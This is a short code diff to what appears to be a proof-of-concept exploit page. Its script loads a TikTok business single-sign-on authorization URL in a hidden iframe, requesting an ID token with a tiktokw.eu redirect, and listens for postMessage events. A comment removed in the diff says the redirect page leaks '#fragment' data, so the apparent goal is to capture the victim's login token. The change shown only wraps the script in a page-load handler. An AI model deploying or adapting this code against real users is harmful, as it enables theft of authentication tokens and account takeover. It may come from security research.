@@ -1,5 +1,5 @@
 <script>
-(function(){
+document.addEventListener("DOMContentLoaded", function() {
     var iframe = document.createElement('iframe');
     iframe.style.display = 'none';
     iframe.src = 'https://business-sso.tiktok.com/oidc/web_auth/?aid=1583&client_id=fae9da30-e377-406a-941d-3ceea97626f4&nonce=xyz&redirect_uri=https://business-suite.tiktokw.eu/message/auth&response_type=id_token&scope=user_id&state=xyz';
@@ -14,7 +14,5 @@
             }, "*");
         }
     }, false);
-
-    // Inside the redirect_uri (https://business-suite.tiktokw.eu/message/auth), there must be a postMessage leaking #fragment data!
-})();
+});
 </script>
